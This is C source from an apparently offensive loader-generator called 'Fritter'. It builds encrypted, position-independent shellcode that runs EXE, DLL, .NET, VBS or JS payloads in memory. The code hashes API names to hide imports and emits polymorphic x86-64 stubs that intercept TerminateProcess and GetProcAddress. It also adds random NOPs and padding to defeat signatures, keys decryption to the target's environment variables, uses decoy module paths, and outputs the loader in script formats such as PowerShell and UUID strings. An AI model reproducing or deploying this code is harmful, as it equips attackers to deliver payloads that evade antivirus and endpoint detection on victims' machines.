    R  = pool[rnd[9] % 5];
    T2 = pool[(rnd[9] % 5 + 1 + rnd[10] % 4) % 5];
    key[0] = key[1] = 0;

    #define PJ(n) do { if(rnd[n] & 1) p += emit_rnd_nop(p, 1 + ((rnd[n] >> 1) & 3)); } while(0)

    // A = image base
    p = x_imm64(p, A, &at); *base_off = (uint8_t)(at - out);
    if(rnd[4] & 1) {
      gen_random(&key[0], 8);
      p = x_imm64(p, T, &at); memcpy(at, &key[0], 8);
      PJ(5);
      p = x_rr(p, 0x31, A, T);
    }
    PJ(6);
    // B = pc - base
    if(rnd[4] & 2) {
      p = x_rr(p, 0x89, B, 1);
      p = x_rr(p, 0x29, B, A);
    } else {
      p = x_rr(p, 0x89, B, A);
      *p++ = 0x48 | (B >> 3); *p++ = 0xF7; *p++ = 0xD8 | (B & 7);       // neg B
      p = x_rr(p, 0x01, B, 1);
    }
    PJ(7);
    // compare with the image size
    if(rnd[4] & 4) {
      *p++ = 0x48 | (B >> 3); *p++ = 0x81; *p++ = 0xF8 | (B & 7);       // cmp B, imm32
      *size_off = (uint8_t)(p - out); p += 4;
    } else {
      if(T >> 3) *p++ = 0x41;
      *p++ = 0xB8 | (T & 7);                                            // mov T32, imm32
      *size_off = (uint8_t)(p - out); p += 4;
      PJ(8);
      p = x_rr(p, 0x39, B, T);
    }

    // two tails, in either order: inside the image / everything else
    *p++ = (rnd[4] & 16) ? 0x73 : 0x72;                                 // jae else / jb inside
    jcc  = p++;
    for(pass = 0; pass < 2; pass++) {
      if((pass == 0) == ((rnd[4] & 16) != 0)) {
        if(A == 0) {
          *p++ = 0x48; *p++ = 0x89; *p++ = 0x02;                        // mov [rdx], rax
        } else if(rnd[11] & 1) {
          *p++ = 0x48 | ((A >> 3) << 2); *p++ = 0x89; *p++ = ((A & 7) << 3) | 2;   // mov [rdx], A
          p = x_rr(p, 0x89, 0, A);                                      // mov rax, A
        } else {
          p = x_rr(p, 0x89, 0, A);
          if(rnd[11] & 2) { *p++ = 0x48; *p++ = 0x89; *p++ = 0x02; }
          else { *p++ = 0x48 | ((A >> 3) << 2); *p++ = 0x89; *p++ = ((A & 7) << 3) | 2; }
        }
        *p++ = 0xC3;                                                    // ret
      } else {
        p = x_imm64(p, R, &at); *real_off = (uint8_t)(at - out);
        if(rnd[4] & 8) {
          gen_random(&key[1], 8);
          p = x_imm64(p, T2, &at); memcpy(at, &key[1], 8);
          PJ(12);
          p = x_rr(p, 0x31, R, T2);
        }
        if(R >> 3) *p++ = 0x41;
        *p++ = 0xFF; *p++ = 0xE0 | (R & 7);                             // jmp R
      }
      if(pass == 0) *jcc = (uint8_t)(p - (jcc + 1));
    }
    #undef PJ
    return (uint32_t)(p - out);
}

#define PJ(n) do { if(rnd[n] & 1) p += emit_rnd_nop(p, 1 + ((rnd[n] >> 1) & 3)); } while(0)

/* Emit the stub that stands in for TerminateProcess(rcx = process,
 * edx = code) inside a payload image: the current-process handle goes to
 * the exit replacement with the code as its argument, any other handle to
 * the real function. The loader patches the two addresses. Returns bytes
 * written (< 64). */
static uint32_t emit_term_stub(uint8_t *out, uint8_t *exit_off, uint8_t *real_off) {
    uint8_t *p = out, *at, *jcc, rnd[8], pool[3] = {0, 10, 11}, R;      // rax, r10, r11
    int     pass;

    gen_random(rnd, sizeof(rnd));
    PJ(2);
    *p++ = 0x48; *p++ = 0x83; *p++ = 0xF9; *p++ = 0xFF;                 // cmp rcx, -1
    *p++ = (rnd[3] & 1) ? 0x75 : 0x74;                                  // jne real / je self
    jcc  = p++;
    for(pass = 0; pass < 2; pass++) {
      R = pool[rnd[pass] % 3];
      if((pass == 0) == ((rnd[3] & 1) != 0)) {
        if(rnd[4] & 1) { *p++ = 0x89; *p++ = 0xD1; }                    // mov ecx, edx
        else           { *p++ = 0x8B; *p++ = 0xCA; }
        PJ(5);
        p = x_imm64(p, R, &at); *exit_off = (uint8_t)(at - out);
      } else {
        p = x_imm64(p, R, &at); *real_off = (uint8_t)(at - out);
      }
      if(R >> 3) *p++ = 0x41;
      *p++ = 0xFF; *p++ = 0xE0 | (R & 7);                               // jmp R
      if(pass == 0) *jcc = (uint8_t)(p - (jcc + 1));
    }
    return (uint32_t)(p - out);
}

/* Emit the stub that stands in for GetProcAddress inside a payload image:
 * it calls the real function and swaps three possible results (exit
 * functions) for their replacements. The loader patches the real function
 * and the three pairs. The stub starts with its stack allocation of *frame
 * bytes, which is all its unwind data has to describe. Returns bytes
 * written (< 128). */
static uint32_t emit_gpa_stub(uint8_t *out, uint8_t *real_off, uint8_t from_off[3],
                              uint8_t to_off[3], uint8_t *frame) {
    uint8_t *p = out, *at, *jcc, rnd[16], R, C;
    uint8_t callr[3] = {0, 10, 11}, cmpr[6] = {1, 2, 8, 9, 10, 11};
    int     i;

    gen_random(rnd, sizeof(rnd));
    *frame = (uint8_t)(0x28 + 0x10 * (rnd[0] % 3));
    *p++ = 0x48; *p++ = 0x83; *p++ = 0xEC; *p++ = *frame;               // sub rsp, frame
    PJ(1);
    R = callr[rnd[2] % 3];
    p = x_imm64(p, R, &at); *real_off = (uint8_t)(at - out);
    if(R >> 3) *p++ = 0x41;
    *p++ = 0xFF; *p++ = 0xD0 | (R & 7);                                 // call R
    for(i = 0; i < 3; i++) {
      PJ(3 + i);
      C = cmpr[rnd[6 + i] % 6];
      p = x_imm64(p, C, &at); from_off[i] = (uint8_t)(at - out);
      p = x_rr(p, 0x39, 0, C);                                          // cmp rax, C
      *p++ = 0x75; jcc = p++;                                           // jne next
      p = x_imm64(p, 0, &at); to_off[i] = (uint8_t)(at - out);          // mov rax, replacement
      *jcc = (uint8_t)(p - (jcc + 1));
    }
    PJ(9);
    *p++ = 0x48; *p++ = 0x83; *p++ = 0xC4; *p++ = *frame;               // add rsp, frame
    *p++ = 0xC3;                                                        // ret
    return (uint32_t)(p - out);
}
#undef PJ

/**
 * Function: build_instance
 * ----------------------------
 *   Creates the data necessary for main loader to execute VBS/JS/EXE/DLL files in memory.
 *
 *   INPUT  : Pointer to a Fritter configuration.
 *
 *   OUTPUT : Fritter error code. 
 */
static int build_instance(PFRITTER_CONFIG c) {
    FRITTER_CRYPT     inst_key;
    PFRITTER_INSTANCE inst = NULL;
    int             cnt, inst_len;
    uint64_t        dll_hash;
    const char *dll_need;
    int             err = FRITTER_ERROR_OK;
    
    DPRINT("Entering.");
    
    // Allocate memory for the size of instance based on the type
    DPRINT("Allocating memory for instance");
    inst_len = sizeof(FRITTER_INSTANCE);
    
    // the module is embedded: add the size of module
    // that will be appended to the end of structure
    DPRINT("The size of module is %" PRIi32 " bytes. "
           "Adding to size of instance.", c->mod_len);
    inst_len += c->mod_len;
    // Add random padding (0-255 bytes) to vary output size
    uint8_t inst_pad_len = 0;
    gen_random(&inst_pad_len, 1);
    inst_len += inst_pad_len;
    DPRINT("Instance padding: %d bytes", inst_pad_len);

    DPRINT("Total length of instance : %"PRIi32, inst_len);

    // allocate zero-initialized memory for instance
    inst = (PFRITTER_INSTANCE)calloc(inst_len, 1);

    // Memory allocation failed? exit
    if(inst == NULL) {
      DPRINT("Memory allocation failed");
      return FRITTER_ERROR_NO_MEMORY;
    }
    
    // set the length of instance and pointer to it in configuration
    c->inst        = inst;
    c->inst_len    = inst->len = inst_len;
    // indicate if we should call RtlExitUserProcess to terminate host process
    inst->exit_opt = c->exit_opt;
    // set the Original Entry Point
    inst->oep      = c->oep;
    // set the entropy level
    inst->entropy  = c->entropy;
    // set the headers level
    inst->headers  = c->headers;

    // encryption enabled?
    if(c->entropy == FRITTER_ENTROPY_DEFAULT) {
      DPRINT("Generating random key for instance");
      if(!gen_random(&inst_key, sizeof(FRITTER_CRYPT))) {
        DPRINT("gen_random() failed");
        err = FRITTER_ERROR_RANDOM;
        goto cleanup;
      }
      // copy local key to configuration
      memcpy(&inst->key, &inst_key, sizeof(FRITTER_CRYPT));
      // the stored key is made incomplete further down (key options)
      
      DPRINT("Generating random string to verify decryption");
      if(!gen_random_string(inst->sig, FRITTER_SIG_LEN)) {
        DPRINT("gen_random() failed");
        err = FRITTER_ERROR_RANDOM;
        goto cleanup;
      }
     
      DPRINT("Generating random IV for Maru hash");
      if(!gen_random(&inst->iv, MARU_IV_LEN)) {
        DPRINT("gen_random() failed");
        err = FRITTER_ERROR_RANDOM;
        goto cleanup;
      }
    }

    DPRINT("Generating hashes for API using IV: %" PRIX64, inst->iv);
    inst->pcfh_hash = maru("RtlPcToFileHeader", inst->iv);
    inst->eh_len    = (uint8_t)emit_pcfh_stub(inst->eh_stub, &inst->eh_base, &inst->eh_size,
                                              &inst->eh_real, inst->eh_key);
    gen_random(&inst->eh_pos, sizeof(inst->eh_pos));
    inst->mask      = (LOADER_PEB1_FN_COUNT > 1 && LOADER_PEB2_FN_COUNT > 1) ? 1 : 0;   // MASK_STUB_BUILT
    inst->gpa_hash  = maru("GetProcAddress", inst->iv);
    inst->term_hash = maru("TerminateProcess", inst->iv);
    inst->tp_len    = (uint8_t)emit_term_stub(inst->tp_stub, &inst->tp_exit, &inst->tp_real);
    inst->gp_len    = (uint8_t)emit_gpa_stub(inst->gp_stub, &inst->gp_real, inst->gp_from,
                                             inst->gp_to, &inst->gp_frame);
    
    dll_need = (c->mod_type == FRITTER_MODULE_NET_DLL || c->mod_type == FRITTER_MODULE_NET_EXE) ? DLL_NAMES_NET :
               (c->mod_type == FRITTER_MODULE_VBS     || c->mod_type == FRITTER_MODULE_JS)      ? DLL_NAMES_SCRIPT :
                                                                                                  DLL_NAMES_NATIVE;
    inst->api_skip = 0;
    for(cnt=0; api_imports[cnt].module != NULL; cnt++) {
      if(cnt >= (int)(sizeof(inst->api.hash)/sizeof(inst->api.hash[0]))) {
        DPRINT("api_imports exceeds FRITTER_INSTANCE.api ceiling (%zu)",
               sizeof(inst->api.hash)/sizeof(inst->api.hash[0]));
        err = FRITTER_ERROR_INVALID_PARAMETER;
        goto cleanup;
      }
      {
        // an API of a DLL this payload type does not need: no hash, slot skipped
        char   base[32];
        size_t bl = strcspn(api_imports[cnt].module, ".");
        if(bl < sizeof(base)) {
          memcpy(base, api_imports[cnt].module, bl); base[bl] = 0;
          if(dll_listed(DLL_NAMES_ALL, base) && !dll_listed(dll_need, base)) {
            gen_random(&inst->api.hash[cnt], sizeof(inst->api.hash[cnt]));
            inst->api_skip |= (uint64_t)1 << cnt;
            continue;
          }
        }
      }
      // calculate hash for DLL string
      dll_hash = maru(api_imports[cnt].module, inst->iv);
      
      // calculate hash for API string.
      // xor with DLL hash and store in instance
      inst->api.hash[cnt] = maru(api_imports[cnt].name, inst->iv) ^ dll_hash;
      
      DPRINT("Hash for %-15s : %-22s = %016" PRIX64, 
        api_imports[cnt].module, 
        api_imports[cnt].name,
        inst->api.hash[cnt]);
    }
    
    // no constant bytes in the part of the instance that stays unencrypted
    gen_random(&inst->api.hash[cnt], (sizeof(inst->api.hash)/sizeof(inst->api.hash[0]) - cnt) * sizeof(inst->api.hash[0]));
    gen_random(&inst->hook, sizeof(inst->hook));

    DPRINT("Setting number of API to %" PRIi32, cnt);
    inst->api_cnt = cnt;
    
    DPRINT("Setting DLL names to %s", dll_need);
    strcpy(inst->dll_names, dll_need);
        
    // if module is .NET assembly
    if(c->mod_type == FRITTER_MODULE_NET_DLL ||
       c->mod_type == FRITTER_MODULE_NET_EXE)
    {
      DPRINT("Copying GUID structures and DLL strings for loading .NET assemblies");

      memcpy(&inst->xIID_AppDomain,        &xIID_AppDomain,        sizeof(GUID));
      memcpy(&inst->xIID_ICLRMetaHost,     &xIID_ICLRMetaHost,     sizeof(GUID));
      memcpy(&inst->xCLSID_CLRMetaHost,    &xCLSID_CLRMetaHost,    sizeof(GUID));
      memcpy(&inst->xIID_ICLRRuntimeInfo,  &xIID_ICLRRuntimeInfo,  sizeof(GUID));
      memcpy(&inst->xIID_ICorRuntimeHost,  &xIID_ICorRuntimeHost,  sizeof(GUID));
      memcpy(&inst->xCLSID_CorRuntimeHost, &xCLSID_CorRuntimeHost, sizeof(GUID));
    } else 
    // if module is VBS or JS
    if(c->mod_type == FRITTER_MODULE_VBS ||
       c->mod_type == FRITTER_MODULE_JS)
    {       
      DPRINT("Copying GUID structures and DLL strings for loading VBS/JS");
      
      memcpy(&inst->xIID_IUnknown,                &xIID_IUnknown,                sizeof(GUID));
      memcpy(&inst->xIID_IDispatch,               &xIID_IDispatch,               sizeof(GUID));
      memcpy(&inst->xIID_IHost,                   &xIID_IHost,                   sizeof(GUID));
      memcpy(&inst->xIID_IActiveScript,           &xIID_IActiveScript,           sizeof(GUID));
      memcpy(&inst->xIID_IActiveScriptSite,       &xIID_IActiveScriptSite,       sizeof(GUID));
      memcpy(&inst->xIID_IActiveScriptSiteWindow, &xIID_IActiveScriptSiteWindow, sizeof(GUID));
      memcpy(&inst->xIID_IActiveScriptParse32,    &xIID_IActiveScriptParse32,    sizeof(GUID));
      memcpy(&inst->xIID_IActiveScriptParse64,    &xIID_IActiveScriptParse64,    sizeof(GUID));
      
      strcpy(inst->wscript,     "WScript");
      strcpy(inst->wscript_exe, "wscript.exe");
      
      if(c->mod_type == FRITTER_MODULE_VBS) {
        memcpy(&inst->xCLSID_ScriptLanguage,    &xCLSID_VBScript, sizeof(GUID));
      } else {
        memcpy(&inst->xCLSID_ScriptLanguage,    &xCLSID_JScript,  sizeof(GUID));
      }
    }

    // if module is an unmanaged EXE
    if(c->mod_type == FRITTER_MODULE_EXE) {
      // does the user specify parameters for the command line?
      if(c->args[0] != 0) {
        DPRINT("Copying strings required to replace command line.");
        
        strcpy(inst->dataname,   ".data");
        strcpy(inst->kernelbase, "kernelbase");
        strcpy(inst->cmd_syms,   "_acmdln;__argv;__p__acmdln;__p___argv;_wcmdln;__wargv;__p__wcmdln;__p___wargv");
      }
      // unless the host is meant to exit with the payload, an EXE
      // that exits must only end the thread it runs on
      if(c->thread != 0 || c->exit_opt != FRITTER_OPT_EXIT_PROCESS) {
        DPRINT("Copying strings required to intercept exit-related API");
        // these exit-related API will be replaced with pointer to RtlExitUserThread
        strcpy(inst->exit_api, "ExitProcess;exit;_exit;_cexit;_c_exit;quick_exit;_Exit;_o_exit;abort;RtlExitUserProcess");
      }
    }

    // decoy module path (config field is larger than the instance field)
    if(memchr(c->decoy, 0, sizeof(inst->decoy)) == NULL) {
      DPRINT("Decoy path is too long.");
      err = FRITTER_ERROR_DECOY_INVALID;
      goto cleanup;
    }
    strcpy(inst->decoy, c->decoy);

    // DLL lending its static TLS slot to a native payload
    if(memchr(c->tls_donor, 0, sizeof(inst->tls_donor)) == NULL) {
      err = FRITTER_ERROR_INVALID_PARAMETER;
      goto cleanup;
    }
    if(c->mod_type == FRITTER_MODULE_DLL || c->mod_type == FRITTER_MODULE_EXE)
      strcpy(inst->tls_donor, c->tls_donor);
    
    // copy module to the tail of the instance
    DPRINT("Copying module data to instance");
    memcpy(&c->inst->module.x, c->mod, c->mod_len);

    // Fill instance padding with random bytes
    if(inst_pad_len > 0) {
      gen_random((uint8_t*)inst + inst_len - inst_pad_len, inst_pad_len);
    }

    // Key options: bits of the key the loader must find by trial, and
    // environment variables of the target mixed into it.
    gen_random(&inst->kopt, offsetof(FRITTER_INSTANCE, api_cnt) - offsetof(FRITTER_INSTANCE, kopt));
    inst->kopt = 0;
    {
      int      bits = (c->key_brute == 0) ? FRITTER_KEY_BRUTE_DEFAULT : (c->key_brute < 0 ? 0 : c->key_brute);
      int      slot, used = 0;
      uint32_t k0, junk;

      for(slot = 0; slot < FRITTER_KEY_ENVS; slot++) used |= (c->key_env[slot][0] != 0);
      if(c->entropy != FRITTER_ENTROPY_DEFAULT) {
        // no encryption, no key
        if(used || c->key_brute > 0) { err = FRITTER_ERROR_INVALID_PARAMETER; goto cleanup; }
        bits = 0;
      }
      if(bits > FRITTER_KEY_BRUTE_MAX) { err = FRITTER_ERROR_INVALID_PARAMETER; goto cleanup; }
      if(bits != 0 || used) {
        inst->kchk = fritter_keychk(inst_key.mk, inst_key.ctr);
        for(slot = 0; slot < FRITTER_KEY_ENVS; slot++) {
          char     name[64], val[256], *eq = strchr(c->key_env[slot], '=');
          uint64_t h[2];
          size_t   i, nl;
          if(c->key_env[slot][0] == 0) continue;
          nl = eq ? (size_t)(eq - c->key_env[slot]) : 0;
          if(nl == 0 || nl >= sizeof(name) || strlen(eq + 1) >= sizeof(val)) { err = FRITTER_ERROR_INVALID_PARAMETER; goto cleanup; }
          // names and values compare without case, as Windows treats them
          for(i = 0; i < nl; i++) name[i] = (char)toupper((unsigned char)c->key_env[slot][i]);
          name[nl] = 0;
          for(i = 0; eq[1 + i] != 0; i++) val[i] = (char)toupper((unsigned char)eq[1 + i]);
          val[i] = 0;
          inst->kenv[slot] = maru(name, inst->iv);
          h[0] = maru(val, inst->iv ^ inst->kenv[slot]);
          h[1] = maru(val, ~inst->iv ^ inst->kenv[slot]);
          for(i = 0; i < FRITTER_KEY_LEN; i++) inst->key.mk[i] ^= ((uint8_t*)h)[i];
          inst->kopt |= (uint16_t)(0x100 << slot);
        }
        if(bits != 0) {
          // random bits where the missing ones were
          uint32_t mask = (bits >= 32) ? 0xFFFFFFFFu : ((1u << bits) - 1);
          gen_random(&junk, sizeof(junk));
          memcpy(&k0, inst->key.mk, 4);
          k0 = (k0 & ~mask) | (junk & mask);
          memcpy(inst->key.mk, &k0, 4);
        }
        inst->kopt |= (uint16_t)bits;
      }
      inst->kopt ^= (uint16_t)FRITTER_PLAIN_MASK(inst, 5);
    }

    // nothing from api_cnt on changes after this
    inst->mac = FRITTER_MAC(inst);

    // encrypt instance?
    if(c->entropy == FRITTER_ENTROPY_DEFAULT) {
      DPRINT("Encrypting instance");
            
      uint8_t *inst_data = (uint8_t*)inst + offsetof(FRITTER_INSTANCE, api_cnt);
      
      fritter_encrypt(
        inst_key.mk, 
        inst_key.ctr, 
        inst_data, 
        c->inst_len - offsetof(FRITTER_INSTANCE, api_cnt));
    }
cleanup:
    // error? release memory for everything
    if(err != FRITTER_ERROR_OK) {
      DPRINT("Releasing memory for module due to errors.");
      free(c->mod);
      c->mod = NULL;   // FritterDelete runs next and must not free it again
    }
    DPRINT("Leaving with error :  %" PRId32, err);
    return err;
}

/**
 * Function: save_file
 * ----------------------------
 *   Creates a file and writes the contents of input buffer to it.
 *
 *   INPUT  : path = where to create file.
 *            data = what to write to file.
 *            len  = length of data.
 *
 *   OUTPUT : Fritter error code.
 */
static int save_file(const char *path, void *data, int len) {
    FILE *out;
    int  err = FRITTER_ERROR_OK;
    
    DPRINT("Entering.");
    out = fopen(path, "wb");
      
    if(out != NULL) {
      DPRINT("Writing %d bytes of %p to %s", len, data, path);
      if(fwrite(data, 1, len, out) != (size_t)len) err = FRITTER_ERROR_FILE_ACCESS;
      if(fclose(out) != 0) err = FRITTER_ERROR_FILE_ACCESS;
    } else err = FRITTER_ERROR_FILE_ACCESS;
    
    DPRINT("Leaving with error :  %" PRId32, err);
    return err;
}

/**
 * Function: save_loader
 * ----------------------------
 *   Saves the loader to output file. Also saves instance for debug builds.
 *
 *   INPUT  : Fritter configuration.
 *
 *   OUTPUT : Fritter error code.
 */
static int save_loader(PFRITTER_CONFIG c) {
    int   err = FRITTER_ERROR_OK;
    FILE *fd;
    
    // if DEBUG is defined, save instance to disk
    #ifdef DEBUG
      DPRINT("Saving instance %p to file. %" PRId32 " bytes.", c->inst, c->inst_len);
      save_file("instance", c->inst, c->inst_len);
    #endif

    // no output file specified?
    if(c->output[0] == 0) {
      // set to default name based on format
      switch(c->format) {
        case FRITTER_FORMAT_BINARY:
          strncpy(c->output, "loader.bin", FRITTER_MAX_NAME-1);
          break;
        case FRITTER_FORMAT_BASE64:
          strncpy(c->output, "loader.b64", FRITTER_MAX_NAME-1);
          break;
        case FRITTER_FORMAT_RUBY:
          strncpy(c->output, "loader.rb",  FRITTER_MAX_NAME-1);
          break;
        case FRITTER_FORMAT_C:
          strncpy(c->output, "loader.c",   FRITTER_MAX_NAME-1);
          break;
        case FRITTER_FORMAT_PYTHON:
          strncpy(c->output, "loader.py",  FRITTER_MAX_NAME-1);
          break;
        case FRITTER_FORMAT_POWERSHELL:
          strncpy(c->output, "loader.ps1", FRITTER_MAX_NAME-1);
          break;
        case FRITTER_FORMAT_CSHARP:
          strncpy(c->output, "loader.cs",  FRITTER_MAX_NAME-1);
          break;
        case FRITTER_FORMAT_HEX:
          strncpy(c->output, "loader.hex", FRITTER_MAX_NAME-1);
          break;
        case FRITTER_FORMAT_UUID:
          strncpy(c->output, "loader.uuid", FRITTER_MAX_NAME-1);
          break;
      }
    }
    // save loader to file
    fd = fopen(c->output, "wb");
    if(fd == NULL) {
      DPRINT("Opening %s failed.", c->output);
      return FRITTER_ERROR_FILE_ACCESS;
    }
    
    {
      // the source formats: variable name and line width per output
      static const uint8_t widths[8] = {8, 10, 12, 14, 16, 18, 20, 24};
      char    name[32];
      uint8_t r = 0;
      if(gen_domain_name(name) && gen_random(&r, 1)) {
        name[0] = (char)(name[0] + 32);
        format_style(name, widths[r & 7]);
      }
    }
    switch(c->format) {
      case FRITTER_FORMAT_BINARY: {
        DPRINT("Saving loader as binary");
        err = (fwrite(c->pic, 1, c->pic_len, fd) == (size_t)c->pic_len)
              ? FRITTER_ERROR_OK : FRITTER_ERROR_FILE_ACCESS;
        break;
      }
      case FRITTER_FORMAT_BASE64: {
        DPRINT("Saving loader as base64 string");
        err = base64_template(c->pic, c->pic_len, fd);
        break;
      }
      case FRITTER_FORMAT_RUBY:
        DPRINT("Saving loader as Ruby string");
        err = ruby_template(c->pic, c->pic_len, fd);
        break;
      case FRITTER_FORMAT_C:
        DPRINT("Saving loader as C string");
        err = c_ruby_template(c->pic, c->pic_len, fd);
        break;
      case FRITTER_FORMAT_PYTHON:
        DPRINT("Saving loader as Python string");
        err = py_template(c->pic, c->pic_len, fd);
        break;
      case FRITTER_FORMAT_POWERSHELL:
        DPRINT("Saving loader as Powershell string");
        err = powershell_template(c->pic, c->pic_len, fd);
        break;
      case FRITTER_FORMAT_CSHARP:
        DPRINT("Saving loader as C# string");
        err = csharp_template(c->pic, c->pic_len, fd);
        break;
      case FRITTER_FORMAT_HEX:
        DPRINT("Saving loader as Hex string");
        err = hex_template(c->pic, c->pic_len, fd);
        break;
      case FRITTER_FORMAT_UUID:
        DPRINT("Saving loader as UUID string");
        err = uuid_template(c->pic, c->pic_len, fd);
        break;
    }
    fclose(fd);
    DPRINT("Leaving with error :  %" PRId32, err);
    return err;
}

/* ============================================================
 * Function-granular dispatch: opcode emitters
 * ============================================================
 *
 * These helpers emit the byte sequences fritter appends to the tail
 * of the loader blob when N>1 per-function dispatch is engaged:
 *
 *   [loader_original][dispatcher_bytes][thunk_0]..[thunk_N-1]
 *
 * The dispatcher and thunks are RESIDENT (plaintext at runtime); the
 * shim's runtime fn_table has one resident entry covering their span
 * so the shim's decrypt loop skips them. Cross-section calls in the
 * loader are rewritten so their disp32 targets a thunk; each thunk
 * loads r10=target_blob_off, r11=callee_id, and tail-jumps to the
 * dispatcher, which decrypts the callee, calls it, and re-encrypts.
 *
 * MS x64 ABI is preserved end-to-end: caller's args reach the callee
 * in rcx/rdx/r8/r9 unchanged, rax returns; r10/r11 are volatile so
 * their use as dispatch metadata carriers is ABI-legal.
 *
 * All opcodes below hand-verified against Intel SDM Vol 2.
 */

/* Emit an x86-64 NOP of exactly `len` bytes (0..15) with random content
   in the disp fields. Uses the 0F 1F /r multi-byte NOP family; on P6+
   the CPU decodes NOP r/m for length only and never dereferences the
   effective address, so the ModR/M/SIB/disp bytes are free entropy. For
   len 10..15 the core is 9 bytes preceded by 66-prefix stacking (the
   documented long-NOP form emitted by MSVC/GCC). Returns bytes written. */
static uint32_t emit_rnd_nop(uint8_t *out, uint32_t len) {
    if(len == 0) return 0;
    if(len > 15) len = 15;
    uint8_t rnd[8];
    gen_random(rnd, 8);
    uint8_t *p = out;
    uint32_t core = len;
    while(core > 9) { *p++ = 0x66; core--; }
    switch(core) {
        case 1:
            *p++ = 0x90;
            break;
        case 2:
            *p++ = 0x66; *p++ = 0x90;
            break;
        case 3:
            /* Randomize between mem-form [rax] (ModR/M=00) and reg-form
               eax (ModR/M=C0); both decode as NOP. */
            *p++ = 0x0F; *p++ = 0x1F;
            *p++ = (rnd[0] & 1) ? 0xC0 : 0x00;
            break;
        case 4:
            *p++ = 0x0F; *p++ = 0x1F; *p++ = 0x40;
            *p++ = rnd[0];
            break;
        case 5:
            *p++ = 0x0F; *p++ = 0x1F; *p++ = 0x44; *p++ = 0x00;
            *p++ = rnd[0];
            break;
        case 6:
            *p++ = 0x66; *p++ = 0x0F; *p++ = 0x1F; *p++ = 0x44; *p++ = 0x00;
            *p++ = rnd[0];
            break;
        case 7:
            *p++ = 0x0F; *p++ = 0x1F; *p++ = 0x80;
            memcpy(p, rnd, 4); p += 4;
            break;
        case 8:
            *p++ = 0x0F; *p++ = 0x1F; *p++ = 0x84; *p++ = 0x00;
            memcpy(p, rnd, 4); p += 4;
            break;
        case 9:
            *p++ = 0x66; *p++ = 0x0F; *p++ = 0x1F; *p++ = 0x84; *p++ = 0x00;
            memcpy(p, rnd, 4); p += 4;
            break;
    }
    return (uint32_t)(p - out);
}

#define THUNK_SIZE 17u  /* mov r10d,imm32; mov r11d,imm32; jmp rel32 = 6+6+5 */

/* Emit one thunk into `out`. Returns bytes written (== THUNK_SIZE).
 *   target_blob_off, where within the loader blob the callee's
 *                     specific entry point lives (loader-base-relative).
 *   callee_id      , index into the runtime fn_table.
 *   dispatcher_rel , signed rel32 from end-of-jmp to dispatcher entry.
 *                     Positive if dispatcher precedes... actually
 *                     dispatcher is BEFORE thunks in blob order
 *                     ([loader][dispatcher][thunks]) so this is
 *                     always negative.
 */
/* Two independent per-build variations coordinate thunk with dispatcher:
 *   input_swap == 0: r10 = target_blob_off, r11 = callee_id (canonical)
 *   input_swap == 1: r11 = target_blob_off, r10 = callee_id (swapped)
 * Both emit_thunk and emit_dispatcher receive the same input_swap so the
 * two agree on which volatile scratch reg carries which value. */
static uint32_t emit_thunk(uint8_t *out,
                           uint32_t target_blob_off,
                           uint32_t callee_id,
                           int32_t  dispatcher_rel,
                           int      input_swap)
{
    uint8_t *p = out;
    /* Semantic role → mov opcode byte. r10 = 0xBA (mov r10d, imm32),
       r11 = 0xBB. Swap flips which one holds which value. */
    uint8_t target_op = input_swap ? 0xBB : 0xBA;
    uint8_t id_op     = input_swap ? 0xBA : 0xBB;
    /* Randomize which mov comes first per callsite (independent axis
       from input_swap). Kills the fixed 12-byte prefix that would
       otherwise repeat verbatim across every thunk. */
    uint8_t order;
    gen_random(&order, 1);
    if(order & 1) {
        *p++ = 0x41; *p++ = id_op;
        memcpy(p, &callee_id, 4); p += 4;
        *p++ = 0x41; *p++ = target_op;
        memcpy(p, &target_blob_off, 4); p += 4;
    } else {
        *p++ = 0x41; *p++ = target_op;
        memcpy(p, &target_blob_off, 4); p += 4;
        *p++ = 0x41; *p++ = id_op;
        memcpy(p, &callee_id, 4); p += 4;
    }
    /* jmp rel32 (E9 disp32) */
    *p++ = 0xE9;
    memcpy(p, &dispatcher_rel, 4); p += 4;
    return (uint32_t)(p - out);
}

/* State-register emission helpers. Every helper takes register indices
   in the 12..15 range (r12/r13/r14/r15) and emits the correct REX +
   ModR/M bytes for the requested operation. Used by both emit_xor_loop
   (for size/key regs) and emit_dispatcher (for the full role rotation).

   All uses of ModR/M rm=100 need SIB (encodes "index+base" instead of
   "base"); r12 as a memory base triggers this (r12 has low3=4, which
   collides with rsp's encoding). r13 as memory base with mod=00 would
   be interpreted as RIP-relative, so we always emit disp8=0 form to
   keep encoding uniform across roles. Costs one byte per load vs the
   variable "shortest form", worth the simplicity. */

/* Emit `mov <dst>d, [<base>+disp8]`. dst/base must be in r8..r15 range. */
static uint32_t emit_mov_r32_at_ptr(uint8_t *out, uint8_t dst, uint8_t base, int8_t disp) {
    uint8_t *p = out;
    uint8_t dst_high  = (dst  >= 8) ? 1 : 0;
    uint8_t base_high = (base >= 8) ? 1 : 0;
    uint8_t dst_low3  = dst  & 7;
    uint8_t base_low3 = base & 7;
    *p++ = 0x40 | (dst_high << 2) | base_high;    /* REX W=0 R=dst B=base */
    *p++ = 0x8B;                                   /* MOV r32, r/m32       */
    if(base_low3 == 4) {
        *p++ = 0x40 | (dst_low3 << 3) | 4;         /* mod=01 rm=100 (SIB)  */
        *p++ = 0x24;                                /* SIB idx=none base=4  */
        *p++ = (uint8_t)disp;
    } else {
        *p++ = 0x40 | (dst_low3 << 3) | base_low3; /* mod=01 rm=base       */
        *p++ = (uint8_t)disp;
    }
    return (uint32_t)(p - out);
}

/* The keystream a protected section is XORed with: a 32-bit xorshift state
 * seeded per section, its low byte used for each data byte in turn. The
 * shift triple and the direction through the section are drawn per output
 * and compiled into the dispatcher's two loops. */
typedef struct { uint8_t sh[3]; uint8_t rev; } fn_stream_t;

/* Apply the keystream to a section (self-inverse). Returns 0 if the state
 * comes back to the seed inside the section, i.e. the stream would repeat. */
static int fn_stream_xor(uint8_t *buf, uint32_t size, uint32_t seed, const fn_stream_t *st, int apply) {
    uint32_t k = seed;
    for(uint32_t i = 0; i < size; i++) {
      if(apply) buf[st->rev ? size - 1 - i : i] ^= (uint8_t)k;
      k ^= k << st->sh[0];
      k ^= k >> st->sh[1];
      k ^= k << st->sh[2];
      if(k == seed) return 0;
    }
    return 1;
}

/* Emit one XOR-in-place loop that toggles a region with the keystream.
 *
 * Caller pre-loads:
 *   rax       = base address of region
 *   size_reg  = size in bytes (upper 32 bits zero, comes from `mov r32,...`)
 *   key_reg   = keystream state (32 bits); advanced by the loop
 *
 * size_reg and key_reg are register indices in the 12..15 range (r12..r15).
 * They're chosen by the dispatcher's per-build role rotation and passed
